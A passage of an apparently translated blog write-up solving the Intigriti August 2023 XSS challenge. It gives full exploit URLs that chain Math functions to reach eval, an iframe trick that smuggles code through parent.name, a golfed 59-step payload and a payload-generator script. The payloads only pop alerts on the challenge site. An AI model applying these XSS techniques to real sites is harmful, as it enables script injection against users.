rCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call">https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call</a></p><h2><span id="arbitrary-xss">Arbitrary XSS</span></h2><p>The above code merely executes the static <code>alert(document.domain)</code> command. Is it possible to execute arbitrary JavaScript code?</p><p>As long as a short enough payload can be found, it seems feasible.</p><p>For instance, <code>eval(location.hash.slice(1))</code> is relatively short, but still a bit long. If you use the script I provided above, it might hang for a while due to some bugs in my code. Ultimately, it generates a result of length 120, which exceeds the 100-character limit.</p><p>However, another payload like <code>eval(&quot;&#39;&quot;+location)</code> works fine and has a length of 85.</p><p><a href="https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.exp.name.at,Math.seeds.push,Math.tan,Math.sinh,Math.sinh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.cbrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.exp,Math.tan,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.expm1,Math.sqrt,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cbrt,Math.cosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.log.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.atan,Math.sinh,Math.cosh,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call#';alert(document.domain+'/arb-xss')">https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.exp.name.at,Math.seeds.push,Math.tan,Math.sinh,Math.sinh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.cbrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.exp,Math.tan,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.expm1,Math.sqrt,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cbrt,Math.cosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.log.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.atan,Math.sinh,Math.cosh,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call#&#39;;alert(document.domain+&#39;/arb-xss&#39;)</a></p><p>Once the ability to execute arbitrary code is achieved, the next step is to strive to identify the shortest possible set of operations.</p><h2><span id="code-golf-time">Code golf time</span></h2><h3><span id="shortest-xss-payload">Shortest XSS payload</span></h3><p>While the previous payload <code>eval(&quot;&#39;&quot;+location)</code> is already quite short, for this challenge, there is an even shorter payload.</p><p>I learned from @DrBrix that you can use <code>eval(parent.name)</code> to shorten the length further, and this clever technique leverages iframes.</p><p>In the challenge page, a special name was set up to ensure it doesn’t get overwritten, but we can utilize it’s parent page. The page <code>https://challenge-0823.intigriti.io/</code> embeds <code>chanllenge/index.html</code> using an iframe, so using <code>parnent.name</code> allows us to access the name of <code>https://challenge-0823.intigriti.io/</code>.</p><p>Thus, @DrBrix’s strategy is as follows: First, create a page named exp.html, add an iframe with the name set to the payload, and replace the location with <code>https://challenge-0823.intigriti.io</code>. </p><p>The structure becomes:</p><pre class="line-numbers language-none"><code class="language-none">- exp.html (top)--- https:&#x2F;&#x2F;challenge-0823.intigriti.io (name: &#39;alert(1)&#39;)------ https:&#x2F;&#x2F;challenge-0823.intigriti.io&#x2F;challenge&#x2F;index.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Then you can use <code>frames[0].frames[0]</code> to access the innermost iframe and redirect it to the prepared URL, resulting in:</p><pre class="line-numbers language-none"><code class="language-none">- exp.html (top)--- https:&#x2F;&#x2F;challenge-0823.intigriti.io (name: &#39;alert(1)&#39;)------ https:&#x2F;&#x2F;challenge-0823.intigriti.io&#x2F;challenge&#x2F;index.html?q&#x3D;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>This way, you can use <code>parent.name</code> to access the adjusted name. The code looks like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'https://challenge-0823.intigriti.io/challenge/index.html?q=Math.random'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>&lt;script>name = "alert(document.domain)"document.location = "https://challenge-0823.intigriti.io/"&lt;/script><span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>eval(parent.name)</code> is the shortest payload I could find. The second shortest is <code>location=parent.name</code>.</p><h3><span id="empty-mathseeds">Empty Math.seeds</span></h3><p>Previously, <code>Math.seeds.pop()</code> was used to clear the content, but this part can be further shortened!</p><p>@y0d3n introduced a technique: <code>Math.seeds.splice(Math.imul())</code>.</p><p>This works because the return value of <code>Math.imul()</code> is 0, and <code>splice(0)</code> means “remove data after(and include) the first element.” Therefore, the entire array is cleared.</p><h3><span id="get-an-empty-string">Get an empty string</span></h3><p>Previously, I used a more convoluted method to generate an empty string. Later, I discovered that <code>Math.random.name</code> could yield an empty string.</p><p>This is due to this part:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span><span class="token function-variable function">random</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>seeds<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0.62536</span><span class="token punctuation">,</span> <span class="token number">0.458483</span><span class="token punctuation">,</span> <span class="token number">0.544523</span><span class="token punctuation">,</span> <span class="token number">0.323421</span><span class="token punctuation">,</span> <span class="token number">0.775465</span><span class="token punctuation">]</span>    next <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>seeds<span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token keyword">this</span><span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>length<span class="token punctuation">]</span>  <span class="token punctuation">&#125;</span>  next <span class="token operator">=</span> next <span class="token operator">*</span> <span class="token number">1103515245</span> <span class="token operator">+</span> <span class="token number">12345</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>next <span class="token operator">/</span> <span class="token number">65536</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">32767</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Notice there’s no name after <code>function</code>, making it an anonymous function. So, we’re assigning an anonymous function to <code>Math.random</code>, hence <code>Math.random.name</code> becomes an empty string.</p><h3><span id="obtaining-fixed-numbers">Obtaining fixed numbers</span></h3><p>I previously used built-in constants like <code>Math.PI</code> to obtain fixed numbers. Later, I learned from @Astrid that we can use forms like <code>STRING.length.valueOf()</code> to get numbers.</p><p>For example, <code>Math.isPrototypeOf.name.length.valueOf()</code> would yield 13. Using this method, we can quickly obtain a fixed number.</p><p>Once we have a fixed number, we can find our desired number with fewer steps, and @Astrid even wrote code to find the shortest path.</p><h3><span id="final-solution">Final solution</span></h3><p>The resulting payload is composed of 59 operations and executes <code>eval(parent.name)</code>(this requires collaboration with the previously mentioned iframe to run).</p><pre class="line-numbers language-none"><code class="language-none">Math.imul,Math.seeds.splice,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.valueOf.name.at,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.isPrototypeOf.name.length.valueOf,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.pow.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.codePointAt.name.at,Math.seeds.push,Math.PI.valueOf,Math.exp,Math.acosh,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.asinh,Math.log2,Math.tan,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.random.name.valueOf,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>The script is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> matchFn<span class="token punctuation">,</span> initPath<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token function">findTarget</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> initPath<span class="token punctuation">)</span>  <span class="token comment">// return the shortest one</span>  <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token punctuation">.</span>length <span class="token operator">-</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">function</span> <span class="token function">findTarget</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>    visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">const</span> list <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> item <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span>      <span class="token keyword">const</span> newPath <span class="token operator">=</span> path <span class="token operator">?</span> path <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> key <span class="token operator">:</span> key      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">matchFn</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> item <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">findTarget</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> newPath<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token parameter">init<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> init<span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">bfs</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> <span class="token punctuation">[</span>path<span class="token punctuation">,</span> current<span class="token punctuation">]</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> value <span class="token operator">=</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">?.</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> newPath <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Math.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>path<span class="token punctuation">]</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> newPath          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">return</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>newPath<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token parameter">arrName<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> currentIndex <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">let</span> codeResult <span class="token operator">=</span> <span class="token string">''</span>  <span class="token comment">// @credit: @y0d3n</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.imul'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.seeds.splice'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">findMathName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> char</span><span class="token punctuation">)</span> <span class="token operator">=></span>      <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math.abs.name.constructor'</span><span class="token punctuation">)</span>     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> char <span class="token keyword">of</span> content<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>    <span class="token comment">// if we can find it in the Math for the current index, use it</span>    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> mapping <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token punctuation">[</span><span class="token string">'Math.LN2.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 0</span>      <span class="token punctuation">[</span><span class="token string">'Math.LOG2E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 1</span>      <span class="token punctuation">[</span><span class="token string">'Math.E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 2</span>      <span class="token punctuation">[</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 3</span>    <span class="token punctuation">]</span>    <span class="token comment">// try to find Math.fn[i] == char</span>    <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>mapping<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> char<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>char <span class="token operator">===</span> <span class="token string">'v'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> <span class="token string">'Math.LN2.valueOf'</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span>mapping<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        currentIndex<span class="token operator">++</span>        found <span class="token operator">=</span> <span class="token boolean">true</span>        <span class="token keyword">break</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @credit: @Astrid</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>char <span class="token operator">===</span> <span class="token string">'('</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.isPrototypeOf.name.length.valueOf'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.log2'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.exp'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>char <span class="token operator">===</span> <span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.exp'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.acosh'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.exp'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token 